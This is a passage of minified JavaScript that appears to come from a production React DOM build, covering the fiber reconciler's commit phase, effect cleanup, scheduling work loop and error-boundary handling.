dy(),r=null!==t.memoizedState,null!==e&&null!==e.memoizedState!==r&&(t.flags|=8192),r&&1&t.mode?1073741824&Dn&&(Zt(t),6&t.subtreeFlags&&(t.flags|=8192)):Zt(t),null;case 24:case 25:return null}throw Error(U(156,t.tag))}function JR(e,t){switch(Wg(t),t.tag){case 1:return xn(t.type)&&vh(),65536&(e=t.flags)?(t.flags=-65537&e|128,t):null;case 3:return Jo(),Ge(Tn),Ge(sn),ty(),65536&(e=t.flags)&&!(128&e)?(t.flags=-65537&e|128,t):null;case 5:return ey(t),null;case 13:if(Ge(rt),null!==(e=t.memoizedState)&&null!==e.dehydrated){if(null===t.alternate)throw Error(U(340));Qo()}return 65536&(e=t.flags)?(t.flags=-65537&e|128,t):null;case 19:return Ge(rt),null;case 4:return Jo(),null;case 10:return Qg(t.type._context),null;case 22:case 23:return dy(),null;case 24:default:return null}}YE=function(e,t){for(var n=t.child;null!==n;){if(5===n.tag||6===n.tag)e.appendChild(n.stateNode);else if(4!==n.tag&&null!==n.child){n.child.return=n,n=n.child;continue}if(n===t)break;for(;null===n.sibling;){if(null===n.return||n.return===t)return;n=n.return}n.sibling.return=n.return,n=n.sibling}},Sm=function(){},WE=function(e,t,n,r){var i=e.memoizedProps;if(i!==r){e=t.stateNode,Es(yr.current);var s,o=null;switch(n){case"input":i=Bp(e,i),r=Bp(e,r),o=[];break;case"select":i=st({},i,{value:void 0}),r=st({},r,{value:void 0}),o=[];break;case"textarea":i=Yp(e,i),r=Yp(e,r),o=[];break;default:"function"!=typeof i.onClick&&"function"==typeof r.onClick&&(e.onclick=yh)}for(u in Gp(n,r),n=null,i)if(!r.hasOwnProperty(u)&&i.hasOwnProperty(u)&&null!=i[u])if("style"===u){var a=i[u];for(s in a)a.hasOwnProperty(s)&&(n||(n={}),n[s]="")}else"dangerouslySetInnerHTML"!==u&&"children"!==u&&"suppressContentEditableWarning"!==u&&"suppressHydrationWarning"!==u&&"autoFocus"!==u&&(bl.hasOwnProperty(u)?o||(o=[]):(o=o||[]).push(u,null));for(u in r){var l=r[u];if(a=null!=i?i[u]:void 0,r.hasOwnProperty(u)&&l!==a&&(null!=l||null!=a))if("style"===u)if(a){for(s in a)!a.hasOwnProperty(s)||l&&l.hasOwnProperty(s)||(n||(n={}),n[s]="");for(s in l)l.hasOwnProperty(s)&&a[s]!==l[s]&&(n||(n={}),n[s]=l[s])}else n||(o||(o=[]),o.push(u,n)),n=l;else"dangerouslySetInnerHTML"===u?(l=l?l.__html:void 0,a=a?a.__html:void 0,null!=l&&a!==l&&(o=o||[]).push(u,l)):"children"===u?"string"!=typeof l&&"number"!=typeof l||(o=o||[]).push(u,""+l):"suppressContentEditableWarning"!==u&&"suppressHydrationWarning"!==u&&(bl.hasOwnProperty(u)?(null!=l&&"onScroll"===u&&Ye("scroll",e),o||a===l||(o=[])):(o=o||[]).push(u,l))}n&&(o=o||[]).push("style",n);var u=o;(t.updateQueue=u)&&(t.flags|=4)}},GE=function(e,t,n,r){n!==r&&(t.flags|=4)};var Tc=!1,tn=!1,ZR="function"==typeof WeakSet?WeakSet:Set,K=null;function Ao(e,t){var n=e.ref;if(null!==n)if("function"==typeof n)try{n(null)}catch(n){lt(e,t,n)}else n.current=null}function _m(e,t,n){try{n()}catch(n){lt(e,t,n)}}var $1=!1;function eA(e,t){if(im=ph,qg(e=X_())){if("selectionStart"in e)var n={start:e.selectionStart,end:e.selectionEnd};else e:{var r=(n=(n=e.ownerDocument)&&n.defaultView||window).getSelection&&n.getSelection();if(r&&0!==r.rangeCount){n=r.anchorNode;var i=r.anchorOffset,s=r.focusNode;r=r.focusOffset;try{n.nodeType,s.nodeType}catch{n=null;break e}var o=0,a=-1,l=-1,u=0,c=0,h=e,d=null;t:for(;;){for(var f;h!==n||0!==i&&3!==h.nodeType||(a=o+i),h!==s||0!==r&&3!==h.nodeType||(l=o+r),3===h.nodeType&&(o+=h.nodeValue.length),null!==(f=h.firstChild);)d=h,h=f;for(;;){if(h===e)break t;if(d===n&&++u===i&&(a=o),d===s&&++c===r&&(l=o),null!==(f=h.nextSibling))break;d=(h=d).parentNode}h=f}n=-1===a||-1===l?null:{start:a,end:l}}else n=null}n=n||{start:0,end:0}}else n=null;for(sm={focusedElem:e,selectionRange:n},ph=!1,K=t;null!==K;)if(e=(t=K).child,0!=(1028&t.subtreeFlags)&&null!==e)e.return=t,K=e;else for(;null!==K;){t=K;try{var p=t.alternate;if(1024&t.flags)switch(t.tag){case 0:case 11:case 15:break;case 1:if(null!==p){var m=p.memoizedProps,g=p.memoizedState,y=t.stateNode,v=y.getSnapshotBeforeUpdate(t.elementType===t.type?m:Xn(t.type,m),g);y.__reactInternalSnapshotBeforeUpdate=v}break;case 3:var w=t.stateNode.containerInfo;1===w.nodeType?w.textContent="":9===w.nodeType&&w.documentElement&&w.removeChild(w.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(U(163))}}catch(e){lt(t,t.return,e)}if(null!==(e=t.sibling)){e.return=t.return,K=e;break}K=t.return}return p=$1,$1=!1,p}function Sl(e,t,n){var r=t.updateQueue;if(null!==(r=null!==r?r.lastEffect:null)){var i=r=r.next;do{if((i.tag&e)===e){var s=i.destroy;i.destroy=void 0,void 0!==s&&_m(t,n,s)}i=i.next}while(i!==r)}}function vd(e,t){if(null!==(t=null!==(t=t.updateQueue)?t.lastEffect:null)){var n=t=t.next;do{if((n.tag&e)===e){var r=n.create;n.destroy=r()}n=n.next}while(n!==t)}}function Em(e){var t=e.ref;if(null!==t){var n=e.stateNode;switch(e.tag){case 5:e=n;break;default:e=n}"function"==typeof t?t(e):t.current=e}}function HE(e){var t=e.alternate;null!==t&&(e.alternate=null,HE(t)),e.child=null,e.deletions=null,e.sibling=null,5===e.tag&&(null!==(t=e.stateNode)&&(delete t[hr],delete t[jl],delete t[lm],delete t[$R],delete t[LR])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function KE(e){return 5===e.tag||3===e.tag||4===e.tag}function L1(e){e:for(;;){for(;null===e.sibling;){if(null===e.return||KE(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;5!==e.tag&&6!==e.tag&&18!==e.tag;){if(2&e.flags||null===e.child||4===e.tag)continue e;e.child.return=e,e=e.child}if(!(2&e.flags))return e.stateNode}}function Tm(e,t,n){var r=e.tag;if(5===r||6===r)e=e.stateNode,t?8===n.nodeType?n.parentNode.insertBefore(e,t):n.insertBefore(e,t):(8===n.nodeType?(t=n.parentNode).insertBefore(e,n):(t=n).appendChild(e),null!=(n=n._reactRootContainer)||null!==t.onclick||(t.onclick=yh));else if(4!==r&&null!==(e=e.child))for(Tm(e,t,n),e=e.sibling;null!==e;)Tm(e,t,n),e=e.sibling}function xm(e,t,n){var r=e.tag;if(5===r||6===r)e=e.stateNode,t?n.insertBefore(e,t):n.appendChild(e);else if(4!==r&&null!==(e=e.child))for(xm(e,t,n),e=e.sibling;null!==e;)xm(e,t,n),e=e.sibling}var Bt=null,Jn=!1;function oi(e,t,n){for(n=n.child;null!==n;)QE(e,t,n),n=n.sibling}function QE(e,t,n){if(gr&&"function"==typeof gr.onCommitFiberUnmount)try{gr.onCommitFiberUnmount(cd,n)}catch{}switch(n.tag){case 5:tn||Ao(n,t);case 6:var r=Bt,i=Jn;Bt=null,oi(e,t,n),Jn=i,null!==(Bt=r)&&(Jn?(e=Bt,n=n.stateNode,8===e.nodeType?e.parentNode.removeChild(n):e.removeChild(n)):Bt.removeChild(n.stateNode));break;case 18:null!==Bt&&(Jn?(e=Bt,n=n.stateNode,8===e.nodeType?Zf(e.parentNode,n):1===e.nodeType&&Zf(e,n),Fl(e)):Zf(Bt,n.stateNode));break;case 4:r=Bt,i=Jn,Bt=n.stateNode.containerInfo,Jn=!0,oi(e,t,n),Bt=r,Jn=i;break;case 0:case 11:case 14:case 15:if(!tn&&(null!==(r=n.updateQueue)&&null!==(r=r.lastEffect))){i=r=r.next;do{var s=i,o=s.destroy;s=s.tag,void 0!==o&&(2&s||4&s)&&_m(n,t,o),i=i.next}while(i!==r)}oi(e,t,n);break;case 1:if(!tn&&(Ao(n,t),"function"==typeof(r=n.stateNode).componentWillUnmount))try{r.props=n.memoizedProps,r.state=n.memoizedState,r.componentWillUnmount()}catch(e){lt(n,t,e)}oi(e,t,n);break;case 21:oi(e,t,n);break;case 22:1&n.mode?(tn=(r=tn)||null!==n.memoizedState,oi(e,t,n),tn=r):oi(e,t,n);break;default:oi(e,t,n)}}function F1(e){var t=e.updateQueue;if(null!==t){e.updateQueue=null;var n=e.stateNode;null===n&&(n=e.stateNode=new ZR),t.forEach((function(t){var r=uA.bind(null,e,t);n.has(t)||(n.add(t),t.then(r,r))}))}}function Qn(e,t){var n=t.deletions;if(null!==n)for(var r=0;r<n.length;r++){var i=n[r];try{var s=e,o=t,a=o;e:for(;null!==a;){switch(a.tag){case 5:Bt=a.stateNode,Jn=!1;break e;case 3:case 4:Bt=a.stateNode.containerInfo,Jn=!0;break e}a=a.return}if(null===Bt)throw Error(U(160));QE(s,o,i),Bt=null,Jn=!1;var l=i.alternate;null!==l&&(l.return=null),i.return=null}catch(e){lt(i,t,e)}}if(12854&t.subtreeFlags)for(t=t.child;null!==t;)XE(t,e),t=t.sibling}function XE(e,t){var n=e.alternate,r=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(Qn(t,e),lr(e),4&r){try{Sl(3,e,e.return),vd(3,e)}catch(t){lt(e,e.return,t)}try{Sl(5,e,e.return)}catch(t){lt(e,e.return,t)}}break;case 1:Qn(t,e),lr(e),512&r&&null!==n&&Ao(n,n.return);break;case 5:if(Qn(t,e),lr(e),512&r&&null!==n&&Ao(n,n.return),32&e.flags){var i=e.stateNode;try{Ol(i,"")}catch(t){lt(e,e.return,t)}}if(4&r&&null!=(i=e.stateNode)){var s=e.memoizedProps,o=null!==n?n.memoizedProps:s,a=e.type,l=e.updateQueue;if(e.updateQueue=null,null!==l)try{"input"===a&&"radio"===s.type&&null!=s.name&&v_(i,s),Hp(a,o);var u=Hp(a,s);for(o=0;o<l.length;o+=2){var c=l[o],h=l[o+1];"style"===c?T_(i,h):"dangerouslySetInnerHTML"===c?__(i,h):"children"===c?Ol(i,h):Rg(i,c,h,u)}switch(a){case"input":jp(i,s);break;case"textarea":w_(i,s);break;case"select":var d=i._wrapperState.wasMultiple;i._wrapperState.wasMultiple=!!s.multiple;var f=s.value;null!=f?Lo(i,!!s.multiple,f,!1):d!==!!s.multiple&&(null!=s.defaultValue?Lo(i,!!s.multiple,s.defaultValue,!0):Lo(i,!!s.multiple,s.multiple?[]:"",!1))}i[jl]=s}catch(t){lt(e,e.return,t)}}break;case 6:if(Qn(t,e),lr(e),4&r){if(null===e.stateNode)throw Error(U(162));i=e.stateNode,s=e.memoizedProps;try{i.nodeValue=s}catch(t){lt(e,e.return,t)}}break;case 3:if(Qn(t,e),lr(e),4&r&&null!==n&&n.memoizedState.isDehydrated)try{Fl(t.containerInfo)}catch(t){lt(e,e.return,t)}break;case 4:Qn(t,e),lr(e);break;case 13:Qn(t,e),lr(e),8192&(i=e.child).flags&&(s=null!==i.memoizedState,i.stateNode.isHidden=s,!s||null!==i.alternate&&null!==i.alternate.memoizedState||(cy=pt())),4&r&&F1(e);break;case 22:if(c=null!==n&&null!==n.memoizedState,1&e.mode?(tn=(u=tn)||c,Qn(t,e),tn=u):Qn(t,e),lr(e),8192&r){if(u=null!==e.memoizedState,(e.stateNode.isHidden=u)&&!c&&1&e.mode)for(K=e,c=e.child;null!==c;){for(h=K=c;null!==K;){switch(f=(d=K).child,d.tag){case 0:case 11:case 14:case 15:Sl(4,d,d.return);break;case 1:Ao(d,d.return);var p=d.stateNode;if("function"==typeof p.componentWillUnmount){r=d,n=d.return;try{t=r,p.props=t.memoizedProps,p.state=t.memoizedState,p.componentWillUnmount()}catch(e){lt(r,n,e)}}break;case 5:Ao(d,d.return);break;case 22:if(null!==d.memoizedState){U1(h);continue}}null!==f?(f.return=d,K=f):U1(h)}c=c.sibling}e:for(c=null,h=e;;){if(5===h.tag){if(null===c){c=h;try{i=h.stateNode,u?"function"==typeof(s=i.style).setProperty?s.setProperty("display","none","important"):s.display="none":(a=h.stateNode,o=null!=(l=h.memoizedProps.style)&&l.hasOwnProperty("display")?l.display:null,a.style.display=E_("display",o))}catch(t){lt(e,e.return,t)}}}else if(6===h.tag){if(null===c)try{h.stateNode.nodeValue=u?"":h.memoizedProps}catch(t){lt(e,e.return,t)}}else if((22!==h.tag&&23!==h.tag||null===h.memoizedState||h===e)&&null!==h.child){h.child.return=h,h=h.child;continue}if(h===e)break e;for(;null===h.sibling;){if(null===h.return||h.return===e)break e;c===h&&(c=null),h=h.return}c===h&&(c=null),h.sibling.return=h.return,h=h.sibling}}break;case 19:Qn(t,e),lr(e),4&r&&F1(e);break;case 21:break;default:Qn(t,e),lr(e)}}function lr(e){var t=e.flags;if(2&t){try{e:{for(var n=e.return;null!==n;){if(KE(n)){var r=n;break e}n=n.return}throw Error(U(160))}switch(r.tag){case 5:var i=r.stateNode;32&r.flags&&(Ol(i,""),r.flags&=-33),xm(e,L1(e),i);break;case 3:case 4:var s=r.stateNode.containerInfo;Tm(e,L1(e),s);break;default:throw Error(U(161))}}catch(t){lt(e,e.return,t)}e.flags&=-3}4096&t&&(e.flags&=-4097)}function tA(e,t,n){K=e,JE(e)}function JE(e,t,n){for(var r=0!=(1&e.mode);null!==K;){var i=K,s=i.child;if(22===i.tag&&r){var o=null!==i.memoizedState||Tc;if(!o){var a=i.alternate,l=null!==a&&null!==a.memoizedState||tn;a=Tc;var u=tn;if(Tc=o,(tn=l)&&!u)for(K=i;null!==K;)l=(o=K).child,22===o.tag&&null!==o.memoizedState?z1(i):null!==l?(l.return=o,K=l):z1(i);for(;null!==s;)K=s,JE(s),s=s.sibling;K=i,Tc=a,tn=u}V1(e)}else 8772&i.subtreeFlags&&null!==s?(s.return=i,K=s):V1(e)}}function V1(e){for(;null!==K;){var t=K;if(8772&t.flags){var n=t.alternate;try{if(8772&t.flags)switch(t.tag){case 0:case 11:case 15:tn||vd(5,t);break;case 1:var r=t.stateNode;if(4&t.flags&&!tn)if(null===n)r.componentDidMount();else{var i=t.elementType===t.type?n.memoizedProps:Xn(t.type,n.memoizedProps);r.componentDidUpdate(i,n.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var s=t.updateQueue;null!==s&&E1(t,s,r);break;case 3:var o=t.updateQueue;if(null!==o){if(n=null,null!==t.child)switch(t.child.tag){case 5:n=t.child.stateNode;break;case 1:n=t.child.stateNode}E1(t,o,n)}break;case 5:var a=t.stateNode;if(null===n&&4&t.flags){n=a;var l=t.memoizedProps;switch(t.type){case"button":case"input":case"select":case"textarea":l.autoFocus&&n.focus();break;case"img":l.src&&(n.src=l.src)}}break;case 6:case 4:case 12:break;case 13:if(null===t.memoizedState){var u=t.alternate;if(null!==u){var c=u.memoizedState;if(null!==c){var h=c.dehydrated;null!==h&&Fl(h)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(U(163))}tn||512&t.flags&&Em(t)}catch(e){lt(t,t.return,e)}}if(t===e){K=null;break}if(null!==(n=t.sibling)){n.return=t.return,K=n;break}K=t.return}}function U1(e){for(;null!==K;){var t=K;if(t===e){K=null;break}var n=t.sibling;if(null!==n){n.return=t.return,K=n;break}K=t.return}}function z1(e){for(;null!==K;){var t=K;try{switch(t.tag){case 0:case 11:case 15:var n=t.return;try{vd(4,t)}catch(e){lt(t,n,e)}break;case 1:var r=t.stateNode;if("function"==typeof r.componentDidMount){var i=t.return;try{r.componentDidMount()}catch(e){lt(t,i,e)}}var s=t.return;try{Em(t)}catch(e){lt(t,s,e)}break;case 5:var o=t.return;try{Em(t)}catch(e){lt(t,o,e)}}}catch(e){lt(t,t.return,e)}if(t===e){K=null;break}var a=t.sibling;if(null!==a){a.return=t.return,K=a;break}K=t.return}}var s2,nA=Math.ceil,Ch=Qr.ReactCurrentDispatcher,ly=Qr.ReactCurrentOwner,jn=Qr.ReactCurrentBatchConfig,Ie=0,Ot=null,_t=null,Wt=0,Dn=0,bo=Wi(0),Dt=0,Kl=null,Ps=0,wd=0,uy=0,_l=null,yn=null,cy=0,ea=1/0,Ar=null,Nh=!1,Im=null,ki=null,xc=!1,yi=null,Mh=0,El=0,km=null,Xc=-1,Jc=0;function hn(){return 6&Ie?pt():-1!==Xc?Xc:Xc=pt()}function Di(e){return 1&e.mode?2&Ie&&0!==Wt?Wt&-Wt:null!==VR.transition?(0===Jc&&(Jc=P_()),Jc):(0!==(e=be)||(e=void 0===(e=window.event)?16:B_(e.type)),e):1}function nr(e,t,n,r){if(50<El)throw El=0,km=null,Error(U(185));vu(e,n,r),(!(2&Ie)||e!==Ot)&&(e===Ot&&(!(2&Ie)&&(wd|=n),4===Dt&&fi(e,Wt)),In(e,r),1===n&&0===Ie&&!(1&t.mode)&&(ea=pt()+500,md&&Gi()))}function In(e,t){var n=e.callbackNode;VM(e,t);var r=fh(e,e===Ot?Wt:0);if(0===r)null!==n&&Q0(n),e.callbackNode=null,e.callbackPriority=0;else if(t=r&-r,e.callbackPriority!==t){if(null!=n&&Q0(n),1===t)0===e.tag?FR(B1.bind(null,e)):aE(B1.bind(null,e)),OR((function(){!(6&Ie)&&Gi()})),n=null;else{switch($_(r)){case 1:n=$g;break;case 4:n=b_;break;case 16:n=dh;break;case 536870912:n=O_;break;default:n=dh}n=o2(n,ZE.bind(null,e))}e.callbackPriority=t,e.callbackNode=n}}function ZE(e,t){if(Xc=-1,Jc=0,6&Ie)throw Error(U(327));var n=e.callbackNode;if(Bo()&&e.callbackNode!==n)return null;var r=fh(e,e===Ot?Wt:0);if(0===r)return null;if(30&r||r&e.expiredLanes||t)t=Rh(e,r);else{t=r;var i=Ie;Ie|=2;var s=t2();for((Ot!==e||Wt!==t)&&(Ar=null,ea=pt()+500,Cs(e,t));;)try{sA();break}catch(t){e2(e,t)}Kg(),Ch.current=s,Ie=i,null!==_t?t=0:(Ot=null,Wt=0,t=Dt)}if(0!==t){if(2===t&&(0!==(i=Zp(e))&&(r=i,t=Dm(e,i))),1===t)throw n=Kl,Cs(e,0),fi(e,r),In(e,pt()),n;if(6===t)fi(e,r);else{if(i=e.current.alternate,!(30&r||rA(i)||(t=Rh(e,r),2===t&&(s=Zp(e),0!==s&&(r=s,t=Dm(e,s))),1!==t)))throw n=Kl,Cs(e,0),fi(e,r),In(e,pt()),n;switch(e.finishedWork=i,e.finishedLanes=r,t){case 0:case 1:throw Error(U(345));case 2:cs(e,yn,Ar);break;case 3:if(fi(e,r),(130023424&r)===r&&10<(t=cy+500-pt())){if(0!==fh(e,0))break;if(((i=e.suspendedLanes)&r)!==r){hn(),e.pingedLanes|=e.suspendedLanes&i;break}e.timeoutHandle=am(cs.bind(null,e,yn,Ar),t);break}cs(e,yn,Ar);break;case 4:if(fi(e,r),(4194240&r)===r)break;for(t=e.eventTimes,i=-1;0<r;){var o=31-tr(r);s=1<<o,(o=t[o])>i&&(i=o),r&=~s}if(r=i,10<(r=(120>(r=pt()-r)?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*nA(r/1960))-r)){e.timeoutHandle=am(cs.bind(null,e,yn,Ar),r);break}cs(e,yn,Ar);break;case 5:cs(e,yn,Ar);break;default:throw Error(U(329))}}}return In(e,pt()),e.callbackNode===n?ZE.bind(null,e):null}function Dm(e,t){var n=_l;return e.current.memoizedState.isDehydrated&&(Cs(e,t).flags|=256),2!==(e=Rh(e,t))&&(t=yn,yn=n,null!==t&&Cm(t)),e}function Cm(e){null===yn?yn=e:yn.push.apply(yn,e)}function rA(e){for(var t=e;;){if(16384&t.flags){var n=t.updateQueue;if(null!==n&&null!==(n=n.stores))for(var r=0;r<n.length;r++){var i=n[r],s=i.getSnapshot;i=i.value;try{if(!rr(s(),i))return!1}catch{return!1}}}if(n=t.child,16384&t.subtreeFlags&&null!==n)n.return=t,t=n;else{if(t===e)break;for(;null===t.sibling;){if(null===t.return||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function fi(e,t){for(t&=~uy,t&=~wd,e.suspendedLanes|=t,e.pingedLanes&=~t,e=e.expirationTimes;0<t;){var n=31-tr(t),r=1<<n;e[n]=-1,t&=~r}}function B1(e){if(6&Ie)throw Error(U(327));Bo();var t=fh(e,0);if(!(1&t))return In(e,pt()),null;var n=Rh(e,t);if(0!==e.tag&&2===n){var r=Zp(e);0!==r&&(t=r,n=Dm(e,r))}if(1===n)throw n=Kl,Cs(e,0),fi(e,t),In(e,pt()),n;if(6===n)throw Error(U(345));return e.finishedWork=e.current.alternate,e.finishedLanes=t,cs(e,yn,Ar),In(e,pt()),null}function hy(e,t){var n=Ie;Ie|=1;try{return e(t)}finally{0===(Ie=n)&&(ea=pt()+500,md&&Gi())}}function $s(e){null!==yi&&0===yi.tag&&!(6&Ie)&&Bo();var t=Ie;Ie|=1;var n=jn.transition,r=be;try{if(jn.transition=null,be=1,e)return e()}finally{be=r,jn.transition=n,!(6&(Ie=t))&&Gi()}}function dy(){Dn=bo.current,Ge(bo)}function Cs(e,t){e.finishedWork=null,e.finishedLanes=0;var n=e.timeoutHandle;if(-1!==n&&(e.timeoutHandle=-1,bR(n)),null!==_t)for(n=_t.return;null!==n;){var r=n;switch(Wg(r),r.tag){case 1:null!=(r=r.type.childContextTypes)&&vh();break;case 3:Jo(),Ge(Tn),Ge(sn),ty();break;case 5:ey(r);break;case 4:Jo();break;case 13:case 19:Ge(rt);break;case 10:Qg(r.type._context);break;case 22:case 23:dy()}n=n.return}if(Ot=e,_t=e=Ci(e.current,null),Wt=Dn=t,Dt=0,Kl=null,uy=wd=Ps=0,yn=_l=null,null!==_s){for(t=0;t<_s.length;t++)if(null!==(r=(n=_s[t]).interleaved)){n.interleaved=null;var i=r.next,s=n.pending;if(null!==s){var o=s.next;s.next=i,r.next=o}n.pending=r}_s=null}return e}function e2(e,t){for(;;){var n=_t;try{if(Kg(),Hc.current=Dh,kh){for(var r=it.memoizedState;null!==r;){var i=r.queue;null!==i&&(i.pending=null),r=r.next}kh=!1}if(Os=0,At=kt=it=null,wl=!1,Wl=0,ly.current=null,null===n||null===n.return){Dt=1,Kl=t,_t=null;break}e:{var s=e,o=n.return,a=n,l=t;if(t=Wt,a.flags|=32768,null!==l&&"object"==typeof l&&"function"==typeof l.then){var u=l,c=a,h=c.tag;if(!(1&c.mode||0!==h&&11!==h&&15!==h)){var d=c.alternate;d?(c.updateQueue=d.updateQueue,c.memoizedState=d.memoizedState,c.lanes=d.lanes):(c.updateQueue=null,c.memoizedState=null)}var f=N1(o);if(null!==f){f.flags&=-257,M1(f,o,a,s,t),1&f.mode&&C1(s,u,t),l=u;var p=(t=f).updateQueue;if(null===p){var m=new Set;m.add(l),t.updateQueue=m}else p.add(l);break e}if(!(1&t)){C1(s,u,t),fy();break e}l=Error(U(426))}else if(Xe&&1&a.mode){var g=N1(o);if(null!==g){!(65536&g.flags)&&(g.flags|=256),M1(g,o,a,s,t),Gg(Zo(l,a));break e}}s=l=Zo(l,a),4!==Dt&&(Dt=2),null===_l?_l=[s]:_l.push(s),s=o;do{switch(s.tag){case 3:s.flags|=65536,t&=-t,s.lanes|=t,_1(s,LE(s,l,t));break e;case 1:a=l;var y=s.type,v=s.stateNode;if(!(128&s.flags||"function"!=typeof y.getDerivedStateFromError&&(null===v||"function"!=typeof v.componentDidCatch||null!==ki&&ki.has(v)))){s.flags|=65536,t&=-t,s.lanes|=t,_1(s,FE(s,a,t));break e}}s=s.return}while(null!==s)}r2(n)}catch(e){t=e,_t===n&&null!==n&&(_t=n=n.return);continue}break}}function t2(){var e=Ch.current;return Ch.current=Dh,null===e?Dh:e}function fy(){(0===Dt||3===Dt||2===Dt)&&(Dt=4),null===Ot||!(268435455&Ps)&&!(268435455&wd)||fi(Ot,Wt)}function Rh(e,t){var n=Ie;Ie|=2;var r=t2();for((Ot!==e||Wt!==t)&&(Ar=null,Cs(e,t));;)try{iA();break}catch(t){e2(e,t)}if(Kg(),Ie=n,Ch.current=r,null!==_t)throw Error(U(261));return Ot=null,Wt=0,Dt}function iA(){for(;null!==_t;)n2(_t)}function sA(){for(;null!==_t&&!MM();)n2(_t)}function n2(e){var t=s2(e.alternate,e,Dn);e.memoizedProps=e.pendingProps,null===t?r2(e):_t=t,ly.current=null}function r2(e){var t=e;do{var n=t.alternate;if(e=t.return,32768&t.flags){if(null!==(n=JR(n,t)))return n.flags&=32767,void(_t=n);if(null===e)return Dt=6,void(_t=null);e.flags|=32768,e.subtreeFlags=0,e.deletions=null}else if(null!==(n=XR(n,t,Dn)))return void(_t=n);if(null!==(t=t.sibling))return void(_t=t);_t=t=e}while(null!==t);0===Dt&&(Dt=5)}function cs(e,t,n){var r=be,i=jn.transition;try{jn.transition=null,be=1,oA(e,t,n,r)}finally{jn.transition=i,be=r}return null}function oA(e,t,n,r){do{Bo()}while(null!==yi);if(6&Ie)throw Error(U(327));n=e.finishedWork;var i=e.finishedLanes;if(null===n)return null;if(e.finishedWork=null,e.finishedLanes=0,n===e.current)throw Error(U(177));e.callbackNode=null,e.callbackPriority=0;var s=n.lanes|n.childLanes;if(UM(e,s),e===Ot&&(_t=Ot=null,Wt=0),!(2064&n.subtreeFlags)&&!(2064&n.flags)||xc||(xc=!0,o2(dh,(function(){return Bo(),null}))),s=0!=(15990&n.flags),15990&n.subtreeFlags||s){s=jn.transition,jn.transition=null;var o=be;be=1;var a=Ie;Ie|=4,ly.current=null,eA(e,n),XE(n,e),kR(sm),ph=!!im,sm=im=null,e.current=n,tA(n),RM(),Ie=a,be=o,jn.transition=s}else e.current=n;if(xc&&(xc=!1,yi=e,Mh=i),0===(s=e.pendingLanes)&&(ki=null),OM(n.stateNode),In(e,pt()),null!==t)for(r=e.onRecoverableError,n=0;n<t.length;n++)r((i=t[n]).value,{componentStack:i.stack,digest:i.digest});if(Nh)throw Nh=!1,e=Im,Im=null,e;return 1&Mh&&0!==e.tag&&Bo(),1&(s=e.pendingLanes)?e===km?El++:(El=0,km=e):El=0,Gi(),null}function Bo(){if(null!==yi){var e=$_(Mh),t=jn.transition,n=be;try{if(jn.transition=null,be=16>e?16:e,null===yi)var r=!1;else{if(e=yi,yi=null,Mh=0,6&Ie)throw Error(U(331));var i=Ie;for(Ie|=4,K=e.current;null!==K;){var s=K,o=s.child;if(16&K.flags){var a=s.deletions;if(null!==a){for(var l=0;l<a.length;l++){var u=a[l];for(K=u;null!==K;){var c=K;switch(c.tag){case 0:case 11:case 15:Sl(8,c,s)}var h=c.child;if(null!==h)h.return=c,K=h;else for(;null!==K;){var d=(c=K).sibling,f=c.return;if(HE(c),c===u){K=null;break}if(null!==d){d.return=f,K=d;break}K=f}}}var p=s.alternate;if(null!==p){var m=p.child;if(null!==m){p.child=null;do{var g=m.sibling;m.sibling=null,m=g}while(null!==m)}}K=s}}if(2064&s.subtreeFlags&&null!==o)o.return=s,K=o;else e:for(;null!==K;){if(2048&(s=K).flags)switch(s.tag){case 0:case 11:case 15:Sl(9,s,s.return)}var y=s.sibling;if(null!==y){y.return=s.return,K=y;break e}K=s.return}}var v=e.current;for(K=v;null!==K;){var w=(o=K).child;if(2064&o.subtreeFlags&&null!==w)w.return=o,K=w;else e:for(o=v;null!==K;){if(2048&(a=K).flags)try{switch(a.tag){case 0:case 11:case 15:vd(9,a)}}catch(e){lt(a,a.return,e)}if(a===o){K=null;break e}var b=a.sibling;if(null!==b){b.return=a.return,K=b;break e}K=a.return}}if(Ie=i,Gi(),gr&&"function"==typeof gr.onPostCommitFiberRoot)try{gr.onPostCommitFiberRoot(cd,e)}catch{}r=!0}return r}finally{be=n,jn.transition=t}}return!1}function j1(e,t,n){e=Ii(e,t=LE(e,t=Zo(n,t),1),1),t=hn(),null!==e&&(vu(e,1,t),In(e,t))}function lt(e,t,n){if(3===e.tag)j1(e,e,n);else for(;null!==t;){if(3===t.tag){j1(t,e,n);break}if(1===t.tag){var r=t.stateNode;if("function"==typeof t.type.getDerivedStateFromError||"function"==typeof r.componentDidCatch&&(null===ki||!ki.has(r))){t=Ii(t,e=FE(t,e=Zo(n,e),1),1),e=hn(),null!==t&&(vu(t,1,e),In(t,e));break}}t=t.return}}function aA(e,t,n){var r=e.pingCache;null!==r&&r.delete(t),t=hn(),e.pingedLanes|=e.suspendedLanes&n,Ot===e&&(Wt&n)===n&&(4===Dt||3===Dt&&(130023424&Wt)===Wt&&500>pt()-cy?Cs(e,0):uy|=n),In(e,t)}function i2(e,t){0===t&&(1&e.mode?(t=pc,!(130023424&(pc<<=1))&&(pc=4194304)):t=1);var n=hn();null!==(e=Yr(e,t))&&(vu(e,t,n),In(e,n))}function lA(e){var t=e.memoizedState,n=0;null!==t&&(n=t.retryLane),i2(e,n)}function uA(e,t){var n=0;switch(e.tag){case 13:var r=e.stateNode,i=e.memoizedState;null!==i&&(n=i.retryLane);break;case 19:r=e.stateNode;break;default:throw Error(U(314))}null!==r&&r.delete(t),i2(e,n)}function o2(e,t){return A_(e,t)}function cA(e,t,n,r){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function zn(e,t,n,r){return new cA(e,t,n,r)}function py(e){return!(!(e=e.prototype)||!e.isReactComponent)}function hA(e){if("function"==typeof e)return 